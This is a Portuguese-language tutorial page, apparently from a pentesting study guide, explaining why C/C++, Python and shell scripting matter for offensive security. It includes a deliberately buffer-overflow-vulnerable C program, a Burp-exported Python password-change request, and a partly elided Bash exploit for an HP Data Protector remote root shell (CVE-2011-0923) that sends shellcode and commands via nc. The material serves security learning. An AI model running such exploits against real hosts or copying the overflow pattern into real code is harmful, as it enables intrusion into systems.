# 💻 Programação

Todas as aplicações foram feitas de código, como entender da segurança delas sem conhecer programação? Não dá! Quanto mais conhecimento nesse requisito, melhor. De fato a pessoa pentester não precisa ser uma grande programadora, na verdade já seria de bom tamanho saber fazer o mínimo de um code-review ou ser capaz de criar scripts/exploits direcionados para as análises, tais como um brute-force ou implementação de criptografia.

Existem muitas linguagens de programação, mas para a área de Segurança Ofensiva, há as mais importantes:



<details>

<summary><mark style="color:purple;">C/C++</mark></summary>

Das linguagens mais antigas, C e C++ são consideradas as mais importantes bases, pois até outras linguagens como JavaScript, Python, C#, Java foram feitas a partir delas. Aprender-las é crucial no ramo da tecnologia da informação, principalmente C, pois estão muito presentes em sistemas operacionais e nos estudos de engenharia reversa e exploração de binários(Arquivos ELF), como exemplo exploração de Kernel. Um pequeno exemplo de um código em C vulnerável a Buffer Overflow:

```c
#include <stdio.h>
#include <string.h>

int main (int argc, char** argv){
    char buf[256];
    strcpy(buf, argv[1]);
    printf("%s\n", buf);
    return 0;
}
```



</details>

<details>

<summary><mark style="color:purple;">Python</mark></summary>

A linguagem mais prática da atualidade, Python é excelente para desenvolvimento dos mais variados exploits, a maioria dos scripts de Infosec encontrados por aí provavelmente estarão nessa linguagem. Para todas as áreas de TI, Python tem uma biblioteca, muitas vezes usei **selenium** ou **requests** para fazer ataques de automação, inclusive o BurpSuite (Ferramenta de Proxying mais usado em Pentest) consegue transformar requisições em script de Python. Importação da requisição acima para um script em python usando o Burp:

```python
import requests

burp0_url = "https://dev.exemplo.com:443/app/v1/trocar_senha"
burp0_headers = {"Authorization": "Bearer b13d217d3e5a8ab802D6ccf4bca93e4",
                 "Accept-Encoding": "gzip, deflate", "Connection": "close"}
burp0_json={"nova_senha": "SuperSenha123", "senha_atual": "123456"}
requests.post(burp0_url, headers=burp0_headers, json=burp0_json)


```

</details>

<details>

<summary><mark style="color:purple;">Shell Script</mark></summary>

Linux é bastante importante como já vimos anteriormente, e Shell Scripting nada mais é do que termos uma maneira para combinar e automatizar o interpretador de comandos do sistema operacional. Assim como o Python, scripts em Bash são encontrados em incontáveis cenários tanto para PoCs de CVEs ou qualquer coisa relacionada à servidores Linux, entender isso seria trivial. Exemplo de um exploit em Bash Script:

```sh
#!/bin/bash
# Exploit Title: HP Data Protector Remote Root Shell for Linux(CVE-2011-0923)
# Author: SZ
# Reference: http://www.zerodayinitiative.com/advisories/ZDI-11-055/

[ $# -lt 3 ] && echo -en "Syntax: `basename ${0}` <host> <port> <commands>\n" && exit 0

HOST=`echo ${@} | awk '{print $1}'`
PORT=`echo ${@} | awk '{print $2}'`
CMD=`echo ${@} | sed 's/'$HOST'.*'${PORT}'\ \ *//g'`
SC=""
SC=${SC}"\x00\x00\x00\xa4\x20\x32\x00\x20"
SC=${SC}"\x2d\x2d\x63\x68\x30\x6b\x73\x2d"
.
.
.
SC=${SC}"\x00\x00\x00\x00\x00\x00\x00\x00"
SC=${SC}"\x00\x00\x00\x00\x00\x00\x00\x00"

SHELLCODE=${SC}
( echo -en ${SHELLCODE} ; echo ${CMD} ) | nc -w1 ${HOST} ${PORT}
```

</details>

